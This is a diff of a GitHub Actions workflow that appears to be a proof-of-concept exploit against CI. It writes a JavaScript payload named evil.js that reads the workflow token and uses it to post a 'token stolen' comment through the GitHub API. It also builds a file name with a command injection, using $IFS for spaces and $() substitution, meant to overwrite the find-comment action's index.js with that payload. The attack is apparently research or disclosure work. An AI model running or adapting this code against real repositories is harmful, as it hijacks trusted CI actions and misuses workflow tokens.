@@ -24,16 +24,16 @@ jobs:
           mkdir -p content
           printf '%s\n' "$PRNUM" > content/pr_number.txt
           printf 'plain report from artifact\n' > content/x.txt
-          cat > content/evil.js <<'JS'
+          cat > content/evil.js <<JS
           (async () => {
             const t = process.env.INPUT_TOKEN || '';
             console.log('GAB_TOKEN_STOLEN len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?'));
             if (t) {
               try {
-                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + (process.env.GAB_TARGET || '8') + '/comments', {
+                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/${PRNUM}/comments', {
                   method: 'POST',
                   headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
-                  body: JSON.stringify({ body: 'GAB_TOKEN_STOLEN: code injected into the find-comment action executed with the workflow token (len=' + t.length + ')' })
+                  body: JSON.stringify({ body: 'GAB_TOKEN_STOLEN: injected code inside find-comment executed with the workflow token (len=' + t.length + ')' })
                 });
                 console.log('GAB_STATUS ' + r.status);
               } catch (e) { console.log('GAB_ERR ' + e.message); }
@@ -43,12 +43,13 @@ jobs:
           JS
           python3 - <<'PY'
           import os
-          u = "$IFS"
-          src = ";".join(["cd"+u+".."]*5 + ["cd"+u+"tmp", "cd"+u+"content", "cd"+u+"content"])
-          dst = ";".join(["cd"+u+"$RUNNER_WORKSPACE", "cd"+u+"..", "cd"+u+"_actions", "cd"+u+"peter-evans",
+          u = "${IFS}"
+          src = ";".join(["cd$IFS.."]*5 + ["cd"+u+"tmp", "cd"+u+"content", "cd"+u+"content"])
+          dst = ";".join(["cd$IFS$RUNNER_TEMP", "cd$IFS..", "cd"+u+"_actions", "cd"+u+"peter-evans",
                           "cd"+u+"find-comment", "cd"+u+"v3", "cd"+u+"dist", "realpath"+u+"index.js"])
           inj = "$(" + src + ";cp" + u + "evil.js" + u + "$(" + dst + "))"
           name = "x" + inj + ".txt"
+          assert len(name) <= 255, len(name)
           with open(os.path.join("content", name), "w") as f:
               f.write("injection carrier\n")
           print("created", len(name), name)
